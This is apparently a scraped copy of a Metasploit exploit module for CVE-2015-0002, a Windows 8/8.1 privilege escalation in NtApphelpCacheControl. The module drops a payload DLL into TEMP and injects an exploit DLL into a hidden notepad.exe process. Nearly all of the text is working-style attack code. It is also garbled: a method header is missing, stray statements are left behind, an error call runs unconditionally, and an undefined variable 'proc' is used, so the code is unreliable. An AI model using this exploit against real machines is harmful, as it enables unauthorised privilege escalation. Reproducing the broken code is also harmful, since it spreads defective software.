# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/post/windows/reflective_dll_injection&#039;

class Metasploit3 < Msf::Exploit::Local
Rank = NormalRanking

include Exploit::EXE
include Msf::Post::File
include Msf::Post::Windows::ReflectiveDLLInjection

def initialize(info={})
super(update_info(info, {
&#039;Name&#039; => &#039;Microsoft Windows NtApphelpCacheControl Improper Authorization Check&#039;,
&#039;Description&#039; => %q{
On Windows, the system call NtApphelpCacheControl (the code is actually in ahcache.sys)
allows application compatibility data to be cached for quick reuse when new processes are
created. A normal user can query the cache but cannot add new cached entries as the
operation is restricted to administrators. This is checked in the function
AhcVerifyAdminContext.

This function has a vulnerability where it doesn&#039;t correctly check the impersonation token
of the caller to determine if the user is an administrator. It reads the caller&#039;s
impersonation token using PsReferenceImpersonationToken and then does a comparison between
the user SID in the token to LocalSystem&#039;s SID. It doesn&#039;t check the impersonation level
of the token so it&#039;s possible to get an identify token on your thread from a local system
process and bypass this check.

This module currently only affects Windows 8 and Windows 8.1, and requires access to
C:\Windows\System\ComputerDefaults.exe (although this can be improved).
},
&#039;License&#039; => MSF_LICENSE,
&#039;Author&#039; =>
[
&#039;James Forshaw&#039;,
&#039;sinn3r&#039;
],
&#039;Platform&#039; => &#039;win&#039;,
&#039;Arch&#039; => [ARCH_X86, ARCH_X86_64],
&#039;DefaultOptions&#039; =>
{
&#039;EXITFUNC&#039; => &#039;thread&#039;,
},
&#039;Targets&#039; =>
[
[ &#039;Windows 8 / Windows 8.1 (x86 and x64)&#039;, {} ]
],
&#039;DefaultTarget&#039; => 0,
&#039;Payload&#039; =>
{
&#039;Space&#039; => 4096,
&#039;DisableNops&#039; => true
},
&#039;References&#039; =>
[
[ &#039;CVE&#039;, &#039;2015-0002&#039; ],
[ &#039;OSVEB&#039;, &#039;116497&#039; ],
[ &#039;EDB&#039;, &#039;35661&#039; ],
[ &#039;URL&#039;, &#039;https://code.google.com/p/google-security-research/issues/detail?id=118&#039;]
],
&#039;DisclosureDate&#039; => &#039;Sep 30 2014&#039;
}))
end

def temp
@temp ||= get_env(&#039;TEMP&#039;).to_s
end

def payload_filepath
@payload_filepath ||= "#{temp}\\#{Rex::Text.rand_text_alpha(6)}.dll"
end

def upload_payload_dll(payload_filepath)
payload = generate_payload_dll({:dll_exitprocess => true})
begin
write_file(payload_filepath, payload)
fail_with(
Failure::Unknown,
"Error uploading file #{payload_filepath}: #{e.class} #{e}"
)
end
end

def upload_payload
print_status("Payload DLL will be: #{payload_filepath}")

# Upload the payload
upload_payload_dll(payload_filepath)
if !file?(payload_filepath)
fail_with(Failure::Unknown, "Failed to save the payload DLL, or got removed. No idea why.")
end
end

def inject_exploit(process)
lib_file_path = ::File.join(
Msf::Config.data_directory, "exploits", "ntapphelpcachecontrol", &#039;exploit.dll&#039;
)

print_status("Creating thread")
exploit_mem, offset = inject_dll_into_process(process, lib_file_path)
var_mem = inject_into_process(process, payload_filepath)
process.thread.create(exploit_mem + offset, var_mem)
end

process = nil
notepad_process = client.sys.process.execute(&#039;notepad.exe&#039;, nil, {&#039;Hidden&#039; => true})
begin
process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
process = client.sys.process.open
rescue ::Exception => e
elog("#{e.message}\nCall stack:\n#{e.backtrace.join("\n")}")
end
process
end

def check
if sysinfo[&#039;OS&#039;] =~ /Windows 8/
# Still an 0day, but since this check doesn&#039;t actually trigger the vulnerability
# so we should only flag this as CheckCode::Appears
return Exploit::CheckCode::Appears
end

Exploit::CheckCode::Safe
end

def exploit
if session.platform !~ /^x86\//
print_error("Sorry, this module currently only allows x86/win32 sessions.")
print_error("You will have to get a x86/win32 session first, and then you can")
print_error("select a x64 payload as this exploit&#039;s payload.")
return
end

print_status("Uploading the payload DLL")
upload_payload

if !proc
fail_with(Failure::Unknown, "Fail to get a notepad.exe to run (to host the exploit)")
end

print_status("Injecting exploit into PID #{proc.pid}")
inject_exploit(proc)
end

